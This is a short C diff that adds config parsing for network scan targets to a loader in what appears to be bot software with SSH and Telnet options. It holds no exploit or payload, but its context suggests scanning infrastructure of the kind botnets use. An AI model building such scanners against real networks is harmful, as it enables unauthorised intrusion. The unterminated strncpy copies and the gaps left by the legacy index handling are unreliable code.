@@ -534,6 +534,19 @@ int load_config(notnet_bot_t *bot, const char *path) {
             bot->ssh_enabled = atoi(value);
         } else if (strcmp(key, "telnet_enabled") == 0) {
             bot->telnet_enabled = atoi(value);
+        } else if (strcmp(key, "scan_targets") == 0) {
+            /* Format: "192.168.1.0/24,10.0.0.0/24" or one per line with prefix "scan_target_X" */
+            if (bot->scan_target_count < 16) {
+                strncpy(bot->scan_targets[bot->scan_target_count], value, 255);
+                bot->scan_target_count++;
+            }
+        } else if (strncmp(key, "scan_target_", 12) == 0) {
+            /* Legacy: scan_target_0, scan_target_1, etc. */
+            int idx = atoi(key + 12);
+            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
+                bot->scan_target_count = idx + 1;
+                strncpy(bot->scan_targets[idx], value, 255);
+            }
         }
     }
     
